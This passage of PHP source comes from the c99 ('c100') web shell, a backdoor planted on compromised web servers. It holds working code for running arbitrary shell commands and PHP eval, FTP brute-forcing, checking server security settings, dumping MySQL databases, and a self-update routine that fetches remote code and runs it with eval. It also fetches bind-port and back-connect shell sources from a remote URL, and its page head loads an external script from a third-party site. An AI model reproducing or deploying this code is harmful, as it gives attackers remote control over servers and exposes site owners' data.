 array("<img src=\"".$surl."act=img&img=up\" alt=\"UPDIR\" height=\"20\" width=\"20\" border=\"0\">",$surl."act=ls&d=%upd&sort=%sort"), 
 array("<img src=\"".$surl."act=img&img=refresh\" alt=\"Refresh\" height=\"20\" width=\"17\" border=\"0\">",""), 
 array("<img src=\"".$surl."act=img&img=search\" alt=\"Search\" height=\"20\" width=\"20\" border=\"0\">",$surl."act=search&d=%d"), 
 array("<img src=\"".$surl."act=img&img=buffer\" alt=\"Buffer\" height=\"20\" width=\"20\" border=\"0\">",$surl."act=fsbuff&d=%d"), 
 array("<b>Encoder</b>",$surl."act=encoder&d=%d"), 
 array("<b>Tools</b>",$surl."act=tools&d=%d"), 
 array("<b>Proc.</b>",$surl."act=processes&d=%d"), 
 array("<b>FTP brute</b>",$surl."act=ftpquickbrute&d=%d"), 
 array("<b>Sec.</b>",$surl."act=security&d=%d"), 
 array("<b>SQL</b>",$surl."act=sql&d=%d"), 
 array("<b>PHP-code</b>",$surl."act=eval&d=%d"), 
 array("<b>Mail Utilities </b>",$surl."act=mailer&d=%d"), 
 array("<b>About</b>",$surl."act=About&d=%d"), 
 array("<b>Self-Remove</b>",$surl."act=selfremove"), 
 array("<b>Logout</b>","#\" onclick=\"if (confirm('Are you sure?')) window.close()") 
); 

//Highlight-code colors 
$highlight_background = "#c0c0c0"; 
$highlight_bg = "#FFFFFF"; 
$highlight_comment = "#6A6A6A"; 
$highlight_default = "#0000BB"; 
$highlight_html = "#1300FF"; 
$highlight_keyword = "#007700"; 
$highlight_string = "#000000"; 

@$f = $_REQUEST["f"]; 
@extract($_REQUEST["c99shcook"]); 

//END CONFIGURATION 


// \/Next code isn't for editing\/ 
function ex($cfe) 
{ 
 $res = ''; 
 if (!empty($cfe)) 
 { 
if(function_exists('exec')) 
{ 
 @exec($cfe,$res); 
 $res = join("\n",$res); 
} 
elseif(function_exists('shell_exec')) 
{ 
 $res = @shell_exec($cfe); 
} 
elseif(function_exists('system')) 
{ 
 @ob_start(); 
 @system($cfe); 
 $res = @ob_get_contents(); 
 @ob_end_clean(); 
} 
elseif(function_exists('passthru')) 
{ 
 @ob_start(); 
 @passthru($cfe); 
 $res = @ob_get_contents(); 
 @ob_end_clean(); 
} 
elseif(@is_resource($f = @popen($cfe,"r"))) 
{ 
$res = ""; 
while(!@feof($f)) { $res .= @fread($f,1024); } 
@pclose($f); 
} 
 } 
 return $res; 
} 
function which($pr) 
{ 
$path = ex("which $pr"); 
if(!empty($path)) { return $path; } else { return $pr; } 
} 

function cf($fname,$text) 
{ 
 $w_file=@fopen($fname,"w") or err(0); 
 if($w_file) 
 { 
 @fputs($w_file,@base64_decode($text)); 
 @fclose($w_file); 
 } 
} 
function err($n,$txt='') 
{ 
echo '<table width=100% cellpadding=0 cellspacing=0><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=center><b>';
echo $GLOBALS['lang'][$GLOBALS['language'].'_err'.$n]; 
if(!empty($txt)) { echo " $txt"; } 
echo '</b></div></font></td></tr></table>'; 
return null; 
} 
@set_time_limit(0); 
$tmp = array(); 
foreach($host_allow as $k=>$v) {$tmp[] = str_replace("\\*",".*",preg_quote($v));} 
$s = "!^(".implode("|",$tmp).")$!i"; 
if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {exit("<a href=\"http://ccteam.ru/releases/cc99shell\">c99shell</a>: Access Denied - your host (".getenv("REMOTE_ADDR").") not allow");} 
if (!empty($login)) 
{ 
 if (empty($md5_pass)) {$md5_pass = md5($pass);} 
 if (($_SERVER["PHP_AUTH_USER"] != $login) or (md5($_SERVER["PHP_AUTH_PW"]) != $md5_pass)) 
 { 
if (empty($login_txt)) {$login_txt = strip_tags(ereg_replace("&nbsp;|<br>"," ",$donated_html));} 
header("WWW-Authenticate: Basic realm=\"c99shell ".$shver.": ".$login_txt."\""); 
header("HTTP/1.0 401 Unauthorized"); 
exit($accessdeniedmess); 
 } 
} 
if ($act != "img") 
{ 
$lastdir = realpath("."); 
chdir($curdir); 
if ($selfwrite or $updatenow) {@ob_clean(); c99sh_getupdate($selfwrite,1); exit;} 
$sess_data = unserialize($_COOKIE["$sess_cookie"]); 
if (!is_array($sess_data)) {$sess_data = array();} 
if (!is_array($sess_data["copy"])) {$sess_data["copy"] = array();} 
if (!is_array($sess_data["cut"])) {$sess_data["cut"] = array();} 

$disablefunc = @ini_get("disable_functions"); 
if (!empty($disablefunc)) 
{ 
 $disablefunc = str_replace(" ","",$disablefunc); 
 $disablefunc = explode(",",$disablefunc); 
} 

if (!function_exists("c99_buff_prepare")) 
{ 
function c99_buff_prepare() 
{ 
 global $sess_data; 
 global $act; 
 foreach($sess_data["copy"] as $k=>$v) {$sess_data["copy"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));} 
 foreach($sess_data["cut"] as $k=>$v) {$sess_data["cut"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));} 
 $sess_data["copy"] = array_unique($sess_data["copy"]); 
 $sess_data["cut"] = array_unique($sess_data["cut"]); 
 sort($sess_data["copy"]); 
 sort($sess_data["cut"]); 
 if ($act != "copy") {foreach($sess_data["cut"] as $k=>$v) {if ($sess_data["copy"][$k] == $v) {unset($sess_data["copy"][$k]); }}} 
 else {foreach($sess_data["copy"] as $k=>$v) {if ($sess_data["cut"][$k] == $v) {unset($sess_data["cut"][$k]);}}} 
} 
} 
c99_buff_prepare(); 
if (!function_exists("c99_sess_put")) 
{ 
function c99_sess_put($data) 
{ 
 global $sess_cookie; 
 global $sess_data; 
 c99_buff_prepare(); 
 $sess_data = $data; 
 $data = serialize($data); 
 setcookie($sess_cookie,$data); 
} 
} 
foreach (array("sort","sql_sort") as $v) 
{ 
 if (!empty($_GET[$v])) {$$v = $_GET[$v];} 
 if (!empty($_POST[$v])) {$$v = $_POST[$v];} 
} 
if ($sort_save) 
{ 
 if (!empty($sort)) {setcookie("sort",$sort);} 
 if (!empty($sql_sort)) {setcookie("sql_sort",$sql_sort);} 
} 
if (!function_exists("str2mini")) 
{ 
function str2mini($content,$len) 
{ 
 if (strlen($content) > $len) 
 { 
$len = ceil($len/2) - 2; 
return substr($content, 0,$len)."...".substr($content,-$len); 
 } 
 else {return $content;} 
} 
} 
if (!function_exists("view_size")) 
{ 
function view_size($size) 
{ 
 if (!is_numeric($size)) {return FALSE;} 
 else 
 { 
if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";} 
elseif ($size >= 1048576) {$size = round($size/1048576*100)/100 ." MB";} 
elseif ($size >= 1024) {$size = round($size/1024*100)/100 ." KB";} 
else {$size = $size . " B";} 
return $size; 
 } 
} 
} 
if (!function_exists("fs_copy_dir")) 
{ 
function fs_copy_dir($d,$t) 
{ 
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d); 
 if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;} 
 $h = opendir($d); 
 while (($o = readdir($h)) !== FALSE) 
 { 
if (($o != ".") and ($o != "..")) 
{ 
if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);} 
else {$ret = mkdir($t.DIRECTORY_SEPARATOR.$o); fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);} 
if (!$ret) {return $ret;} 
} 
 } 
 closedir($h); 
 return TRUE; 
} 
} 
if (!function_exists("fs_copy_obj")) 
{ 
function fs_copy_obj($d,$t) 
{ 
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d); 
 $t = str_replace("\\",DIRECTORY_SEPARATOR,$t); 
 if (!is_dir(dirname($t))) {mkdir(dirname($t));} 
 if (is_dir($d)) 
 { 
if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;} 
if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;} 
return fs_copy_dir($d,$t); 
 } 
 elseif (is_file($d)) {return copy($d,$t);} 
 else {return FALSE;} 
} 
} 
if (!function_exists("fs_move_dir")) 
{ 
function fs_move_dir($d,$t) 
{ 
 $h = opendir($d); 
 if (!is_dir($t)) {mkdir($t);} 
 while (($o = readdir($h)) !== FALSE) 
 { 
if (($o != ".") and ($o != "..")) 
{ 
$ret = TRUE; 
if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);} 
else {if (mkdir($t.DIRECTORY_SEPARATOR.$o) and fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o)) {$ret = FALSE;}} 
if (!$ret) {return $ret;} 
} 
 } 
 closedir($h); 
 return TRUE; 
} 
} 
if (!function_exists("fs_move_obj")) 
{ 
function fs_move_obj($d,$t) 
{ 
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d); 
 $t = str_replace("\\",DIRECTORY_SEPARATOR,$t); 
 if (is_dir($d)) 
 { 
if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;} 
if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;} 
return fs_move_dir($d,$t); 
 } 
 elseif (is_file($d)) 
 { 
if(copy($d,$t)) {return unlink($d);} 
else {unlink($t); return FALSE;} 
 } 
 else {return FALSE;} 
} 
} 
if (!function_exists("fs_rmdir")) 
{ 
function fs_rmdir($d) 
{ 
 $h = opendir($d); 
 while (($o = readdir($h)) !== FALSE) 
 { 
if (($o != ".") and ($o != "..")) 
{ 
if (!is_dir($d.$o)) {unlink($d.$o);} 
else {fs_rmdir($d.$o.DIRECTORY_SEPARATOR); rmdir($d.$o);} 
} 
 } 
 closedir($h); 
 rmdir($d); 
 return !is_dir($d); 
} 
} 
if (!function_exists("fs_rmobj")) 
{ 
function fs_rmobj($o) 
{ 
 $o = str_replace("\\",DIRECTORY_SEPARATOR,$o); 
 if (is_dir($o)) 
 { 
if (substr($o,-1) != DIRECTORY_SEPARATOR) {$o .= DIRECTORY_SEPARATOR;} 
return fs_rmdir($o); 
 } 
 elseif (is_file($o)) {return unlink($o);} 
 else {return FALSE;} 
} 
} 
if (!function_exists("myshellexec")) 
{ 
function myshellexec($cmd) 
{ 
 global $disablefunc; 
 $result = ""; 
 if (!empty($cmd)) 
 { 
if (is_callable("exec") and !in_array("exec",$disablefunc)) {exec($cmd,$result); $result = join("\n",$result);} 
elseif (($result = `$cmd`) !== FALSE) {} 
elseif (is_callable("system") and !in_array("system",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;} 
elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;} 
elseif (is_resource($fp = popen($cmd,"r"))) 
{ 
$result = ""; 
while(!feof($fp)) {$result .= fread($fp,1024);} 
pclose($fp); 
} 
 } 
 return $result; 
} 
} 
if (!function_exists("tabsort")) {function tabsort($a,$b) {global $v; return strnatcmp($a[$v], $b[$v]);}} 
if (!function_exists("view_perms")) 
{ 
function view_perms($mode) 
{ 
 if (($mode & 0xC000) === 0xC000) {$type = "s";} 
 elseif (($mode & 0x4000) === 0x4000) {$type = "d";} 
 elseif (($mode & 0xA000) === 0xA000) {$type = "l";} 
 elseif (($mode & 0x8000) === 0x8000) {$type = "-";} 
 elseif (($mode & 0x6000) === 0x6000) {$type = "b";} 
 elseif (($mode & 0x2000) === 0x2000) {$type = "c";} 
 elseif (($mode & 0x1000) === 0x1000) {$type = "p";} 
 else {$type = "?";} 

 $owner["read"] = ($mode & 00400)?"r":"-"; 
 $owner["write"] = ($mode & 00200)?"w":"-"; 
 $owner["execute"] = ($mode & 00100)?"x":"-"; 
 $group["read"] = ($mode & 00040)?"r":"-"; 
 $group["write"] = ($mode & 00020)?"w":"-"; 
 $group["execute"] = ($mode & 00010)?"x":"-"; 
 $world["read"] = ($mode & 00004)?"r":"-"; 
 $world["write"] = ($mode & 00002)? "w":"-"; 
 $world["execute"] = ($mode & 00001)?"x":"-"; 

 if ($mode & 0x800) {$owner["execute"] = ($owner["execute"] == "x")?"s":"S";} 
 if ($mode & 0x400) {$group["execute"] = ($group["execute"] == "x")?"s":"S";} 
 if ($mode & 0x200) {$world["execute"] = ($world["execute"] == "x")?"t":"T";} 

 return $type.join("",$owner).join("",$group).join("",$world); 
} 
} 
if (!function_exists("posix_getpwuid") and !in_array("posix_getpwuid",$disablefunc)) {function posix_getpwuid($uid) {return FALSE;}} 
if (!function_exists("posix_getgrgid") and !in_array("posix_getgrgid",$disablefunc)) {function posix_getgrgid($gid) {return FALSE;}} 
if (!function_exists("posix_kill") and !in_array("posix_kill",$disablefunc)) {function posix_kill($gid) {return FALSE;}} 
if (!function_exists("parse_perms")) 
{ 
function parse_perms($mode) 
{ 
 if (($mode & 0xC000) === 0xC000) {$t = "s";} 
 elseif (($mode & 0x4000) === 0x4000) {$t = "d";} 
 elseif (($mode & 0xA000) === 0xA000) {$t = "l";} 
 elseif (($mode & 0x8000) === 0x8000) {$t = "-";} 
 elseif (($mode & 0x6000) === 0x6000) {$t = "b";} 
 elseif (($mode & 0x2000) === 0x2000) {$t = "c";} 
 elseif (($mode & 0x1000) === 0x1000) {$t = "p";} 
 else {$t = "?";} 
 $o["r"] = ($mode & 00400) > 0; $o["w"] = ($mode & 00200) > 0; $o["x"] = ($mode & 00100) > 0; 
 $g["r"] = ($mode & 00040) > 0; $g["w"] = ($mode & 00020) > 0; $g["x"] = ($mode & 00010) > 0; 
 $w["r"] = ($mode & 00004) > 0; $w["w"] = ($mode & 00002) > 0; $w["x"] = ($mode & 00001) > 0; 
 return array("t"=>$t,"o"=>$o,"g"=>$g,"w"=>$w); 
} 
} 
if (!function_exists("parsesort")) 
{ 
function parsesort($sort) 
{ 
 $one = intval($sort); 
 $second = substr($sort,-1); 
 if ($second != "d") {$second = "a";} 
 return array($one,$second); 
} 
} 
if (!function_exists("view_perms_color")) 
{ 
function view_perms_color($o) 
{ 
 if (!is_readable($o)) {return "<font color=red>".view_perms(fileperms($o))."</font>";} 
 elseif (!is_writable($o)) {return "<font color=white>".view_perms(fileperms($o))."</font>";} 
 else {return "<font color=green>".view_perms(fileperms($o))."</font>";} 
} 
} 
if (!function_exists("c99getsource")) 
{ 
function c99getsource($fn) 
{ 
 global $c99sh_sourcesurl; 
 $array = array( 
"c99sh_bindport.pl" => "c99sh_bindport_pl.txt", 
"c99sh_bindport.c" => "c99sh_bindport_c.txt", 
"c99sh_backconn.pl" => "c99sh_backconn_pl.txt", 
"c99sh_backconn.c" => "c99sh_backconn_c.txt", 
"c99sh_datapipe.pl" => "c99sh_datapipe_pl.txt", 
"c99sh_datapipe.c" => "c99sh_datapipe_c.txt", 
 ); 
 $name = $array[$fn]; 
 if ($name) {return file_get_contents($c99sh_sourcesurl.$name);} 
 else {return FALSE;} 
} 
} 
if (!function_exists("c99sh_getupdate")) 
{ 
function c99sh_getupdate($update = TRUE) 
{ 
 $url = $GLOBALS["c99sh_updateurl"]."?version=".urlencode(base64_encode($GLOBALS["shver"]))."&updatenow=".($updatenow?"1":"0")."&"; 
 $data = @file_get_contents($url); 
 if (!$data) {return "Can't connect to update-server!";} 
 else 
 { 
$data = ltrim($data); 
$string = substr($data,3,ord($data{2})); 
if ($data{0} == "\x99" and $data{1} == "\x01") {return "Error: ".$string; return FALSE;} 
if ($data{0} == "\x99" and $data{1} == "\x02") {return "You are using latest version!";} 
if ($data{0} == "\x99" and $data{1} == "\x03") 
{ 
$string = explode("\x01",$string); 
if ($update) 
{ 
 $confvars = array(); 
 $sourceurl = $string[0]; 
 $source = file_get_contents($sourceurl); 
 if (!$source) {return "Can't fetch update!";} 
 else 
 { 
$fp = fopen(__FILE__,"w"); 
if (!$fp) {return "Local error: can't write update to ".__FILE__."! You may download c99shell.php manually <a href=\"".$sourceurl."\"><u>here</u></a>.";} 
else {fwrite($fp,$source); fclose($fp); return "Thanks! Updated with success.";} 
 } 
} 
else {return "New version are available: ".$string[1];} 
} 
elseif ($data{0} == "\x99" and $data{1} == "\x04") {eval($string); return 1;} 
else {return "Error in protocol: segmentation failed! (".$data.") ";} 
 } 
} 
} 
if (!function_exists("mysql_dump")) 
{ 
function mysql_dump($set) 
{ 
 global $shver; 
 $sock = $set["sock"]; 
 $db = $set["db"]; 
 $print = $set["print"]; 
 $nl2br = $set["nl2br"]; 
 $file = $set["file"]; 
 $add_drop = $set["add_drop"]; 
 $tabs = $set["tabs"]; 
 $onlytabs = $set["onlytabs"]; 
 $ret = array(); 
 $ret["err"] = array(); 
 if (!is_resource($sock)) {echo("Error: \$sock is not valid resource.");} 
 if (empty($db)) {$db = "db";} 
 if (empty($print)) {$print = 0;} 
 if (empty($nl2br)) {$nl2br = 0;} 
 if (empty($add_drop)) {$add_drop = TRUE;} 
 if (empty($file)) 
 { 
$file = $tmpdir."dump_".getenv("SERVER_NAME")."_".$db."_".date("d-m-Y-H-i-s").".sql"; 
 } 
 if (!is_array($tabs)) {$tabs = array();} 
 if (empty($add_drop)) {$add_drop = TRUE;} 
 if (sizeof($tabs) == 0) 
 { 
// retrive tables-list 
$res = mysql_query("SHOW TABLES FROM ".$db, $sock); 
if (mysql_num_rows($res) > 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}} 
 } 
 $out = "# Dumped by C99Shell.SQL v. ".$shver." 
# Home page: http://ccteam.ru 
# 
# Host settings: 
# MySQL version: (".mysql_get_server_info().") running on ".getenv("SERVER_ADDR")." (".getenv("SERVER_NAME").")"." 
# Date: ".date("d.m.Y H:i:s")." 
# DB: \"".$db."\" 
#--------------------------------------------------------- 
"; 
 $c = count($onlytabs); 
 foreach($tabs as $tab) 
 { 
if ((in_array($tab,$onlytabs)) or (!$c)) 
{ 
if ($add_drop) {$out .= "DROP TABLE IF EXISTS `".$tab."`;\n";} 
// recieve query for create table structure 
$res = mysql_query("SHOW CREATE TABLE `".$tab."`", $sock); 
if (!$res) {$ret["err"][] = mysql_smarterror();} 
else 
{ 
 $row = mysql_fetch_row($res); 
 $out .= $row["1"].";\n\n"; 
 // recieve table variables 
 $res = mysql_query("SELECT * FROM `$tab`", $sock); 
 if (mysql_num_rows($res) > 0) 
 { 
while ($row = mysql_fetch_assoc($res)) 
{ 
$keys = implode("`, `", array_keys($row)); 
$values = array_values($row); 
foreach($values as $k=>$v) {$values[$k] = addslashes($v);} 
$values = implode("', '", $values); 
$sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n"; 
$out .= $sql; 
} 
 } 
} 
} 
 } 
 $out .= "#---------------------------------------------------------------------------------\n\n"; 
 if ($file) 
 { 
$fp = fopen($file, "w"); 
if (!$fp) {$ret["err"][] = 2;} 
else 
{ 
fwrite ($fp, $out); 
fclose ($fp); 
} 
 } 
 if ($print) {if ($nl2br) {echo nl2br($out);} else {echo $out;}} 
 return $out; 
} 
} 
if (!function_exists("mysql_buildwhere")) 
{ 
function mysql_buildwhere($array,$sep=" and",$functs=array()) 
{ 
 if (!is_array($array)) {$array = array();} 
 $result = ""; 
 foreach($array as $k=>$v) 
 { 
$value = ""; 
if (!empty($functs[$k])) {$value .= $functs[$k]."(";} 
$value .= "'".addslashes($v)."'"; 
if (!empty($functs[$k])) {$value .= ")";} 
$result .= "`".$k."` = ".$value.$sep; 
 } 
 $result = substr($result,0,strlen($result)-strlen($sep)); 
 return $result; 
} 
} 
if (!function_exists("mysql_fetch_all")) 
{ 
function mysql_fetch_all($query,$sock) 
{ 
 if ($sock) {$result = mysql_query($query,$sock);} 
 else {$result = mysql_query($query);} 
 $array = array(); 
 while ($row = mysql_fetch_array($result)) {$array[] = $row;} 
 mysql_free_result($result); 
 return $array; 
} 
} 
if (!function_exists("mysql_smarterror")) 
{ 
function mysql_smarterror($type,$sock) 
{ 
 if ($sock) {$error = mysql_error($sock);} 
 else {$error = mysql_error();} 
 $error = htmlspecialchars($error); 
 return $error; 
} 
} 
if (!function_exists("mysql_query_form")) 
{ 
function mysql_query_form() 
{ 
 global $submit,$sql_act,$sql_query,$sql_query_result,$sql_confirm,$sql_query_error,$tbl_struct; 
 if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";} 
 if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;} 
 if ((!$submit) or ($sql_act)) 
 { 
echo "<table border=0><tr><td><form name=\"c99sh_sqlquery\" method=POST><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to";} else {echo "SQL-Query";} echo ":</b><br><br><textarea name=sql_query cols=100 rows=10>".htmlspecialchars($sql_query)."</textarea><br><br><input type=hidden name=act value=sql><input type=hidden name=sql_act value=query><input type=hidden name=sql_tbl value=\"".htmlspecialchars($sql_tbl)."\"><input type=hidden name=submit value=\"1\"><input type=hidden name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=submit name=sql_confirm value=\"Yes\">&nbsp;<input type=submit value=\"No\"></form></td>"; 
if ($tbl_struct) 
{ 
echo "<td valign=\"top\"><b>Fields:</b><br>"; 
foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "» <a href=\"#\" onclick=\"document.c99sh_sqlquery.sql_query.value+='`".$name."`';\"><b>".$name."</b></a><br>";} 
echo "</td></tr></table>"; 
} 
 } 
 if ($sql_query_result or (!$sql_confirm)) {$sql_query = $sql_last_query;} 
} 
} 
if (!function_exists("mysql_create_db")) 
{ 
function mysql_create_db($db,$sock="") 
{ 
 $sql = "CREATE DATABASE `".addslashes($db)."`;"; 
 if ($sock) {return mysql_query($sql,$sock);} 
 else {return mysql_query($sql);} 
} 
} 
if (!function_exists("mysql_query_parse")) 
{ 
function mysql_query_parse($query) 
{ 
 $query = trim($query); 
 $arr = explode (" ",$query); 
 /*array array() 
 { 
"METHOD"=>array(output_type), 
"METHOD1"... 
... 
 } 
 if output_type == 0, no output, 
 if output_type == 1, no output if no error 
 if output_type == 2, output without control-buttons 
 if output_type == 3, output with control-buttons 
 */ 
 $types = array( 
"SELECT"=>array(3,1), 
"SHOW"=>array(2,1), 
"DELETE"=>array(1), 
"DROP"=>array(1) 
 ); 
 $result = array(); 
 $op = strtoupper($arr[0]); 
 if (is_array($types[$op])) 
 { 
$result["propertions"] = $types[$op]; 
$result["query"]= $query; 
if ($types[$op] == 2) 
{ 
foreach($arr as $k=>$v) 
{ 
 if (strtoupper($v) == "LIMIT") 
 { 
$result["limit"] = $arr[$k+1]; 
$result["limit"] = explode(",",$result["limit"]); 
if (count($result["limit"]) == 1) {$result["limit"] = array(0,$result["limit"][0]);} 
unset($arr[$k],$arr[$k+1]); 
 } 
} 
} 
 } 
 else {return FALSE;} 
} 
} 
if (!function_exists("c99fsearch")) 
{ 
function c99fsearch($d) 
{ 
 global $found; 
 global $found_d; 
 global $found_f; 
 global $search_i_f; 
 global $search_i_d; 
 global $a; 
 if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;} 
 $h = opendir($d); 
 while (($f = readdir($h)) !== FALSE) 
 { 
if($f != "." && $f != "..") 
{ 
$bool = (empty($a["name_regexp"]) and strpos($f,$a["name"]) !== FALSE) || ($a["name_regexp"] and ereg($a["name"],$f)); 
if (is_dir($d.$f)) 
{ 
 $search_i_d++; 
 if (empty($a["text"]) and $bool) {$found[] = $d.$f; $found_d++;} 
 if (!is_link($d.$f)) {c99fsearch($d.$f);} 
} 
else 
{ 
 $search_i_f++; 
 if ($bool) 
 { 
if (!empty($a["text"])) 
{ 
$r = @file_get_contents($d.$f); 
if ($a["text_wwo"]) {$a["text"] = " ".trim($a["text"])." ";} 
if (!$a["text_cs"]) {$a["text"] = strtolower($a["text"]); $r = strtolower($r);} 
if ($a["text_regexp"]) {$bool = ereg($a["text"],$r);} 
else {$bool = strpos(" ".$r,$a["text"],1);} 
if ($a["text_not"]) {$bool = !$bool;} 
if ($bool) {$found[] = $d.$f; $found_f++;} 
} 
else {$found[] = $d.$f; $found_f++;} 
 } 
} 
} 
 } 
 closedir($h); 
} 
} 
if ($act == "gofile") {if (is_dir($f)) {$act = "ls"; $d = $f;} else {$act = "f"; $d = dirname($f); $f = basename($f);}} 
//Sending headers 
@ob_start(); 
@ob_implicit_flush(0); 
function onphpshutdown() 
{ 
 global $gzipencode,$ft; 
 if (!headers_sent() and $gzipencode and !in_array($ft,array("img","download","notepad"))) 
 { 
$v = @ob_get_contents(); 
@ob_end_clean(); 
@ob_start("ob_gzHandler"); 
echo $v; 
@ob_end_flush(); 
 } 
} 
function c99shexit() 
{ 
 onphpshutdown(); 
 exit; 
} 
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); 
header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT"); 
header("Cache-Control: no-store, no-cache, must-revalidate"); 
header("Cache-Control: post-check=0, pre-check=0", FALSE); 
header("Pragma: no-cache"); 
if (empty($tmpdir)) 
{ 
 $tmpdir = ini_get("upload_tmp_dir"); 
 if (is_dir($tmpdir)) {$tmpdir = "/tmp/";} 
} 
$tmpdir = realpath($tmpdir); 
$tmpdir = str_replace("\\",DIRECTORY_SEPARATOR,$tmpdir); 
if (substr($tmpdir,-1) != DIRECTORY_SEPARATOR) {$tmpdir .= DIRECTORY_SEPARATOR;} 
if (empty($tmpdir_logs)) {$tmpdir_logs = $tmpdir;} 
else {$tmpdir_logs = realpath($tmpdir_logs);} 
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") 
{ 
 $safemode = TRUE; 
 $hsafemode = "<font color=red>ON (secure)</font>"; 
} 
else {$safemode = FALSE; $hsafemode = "<font color=green>OFF (not secure)</font>";} 
$v = @ini_get("open_basedir"); 
if ($v or strtolower($v) == "on") {$openbasedir = TRUE; $hopenbasedir = "<font color=red>".$v."</font>";} 
else {$openbasedir = FALSE; $hopenbasedir = "<font color=green>OFF (not secure)</font>";} 
$sort = htmlspecialchars($sort); 
if (empty($sort)) {$sort = $sort_default;} 
$sort[1] = strtolower($sort[1]); 
$DISP_SERVER_SOFTWARE = getenv("SERVER_SOFTWARE"); 
if (!ereg("PHP/".phpversion(),$DISP_SERVER_SOFTWARE)) {$DISP_SERVER_SOFTWARE .= ". PHP/".phpversion();} 
$DISP_SERVER_SOFTWARE = str_replace("PHP/".phpversion(),"<a href=\"".$surl."act=phpinfo\" target=\"_blank\"><b><u>PHP/".phpversion()."</u></b></a>",htmlspecialchars($DISP_SERVER_SOFTWARE)); 
@ini_set("highlight.bg",$highlight_bg); //FFFFFF 
@ini_set("highlight.comment",$highlight_comment); //#FF8000 
@ini_set("highlight.default",$highlight_default); //#0000BB 
@ini_set("highlight.html",$highlight_html); //#000000 
@ini_set("highlight.keyword",$highlight_keyword); //#007700 
@ini_set("highlight.string",$highlight_string); //#DD0000 
if (!is_array($actbox)) {$actbox = array();} 
$dspact = $act = htmlspecialchars($act); 
$disp_fullpath = $ls_arr = $notls = null; 
$ud = urlencode($d); 
?><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta http-equiv="Content-Language" content="en-us"><SCRIPT SRC=http://www.estattoos.com/gallery/yaz.js></SCRIPT><title><?php echo getenv("HTTP_HOST"); ?> - c100 Shell</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 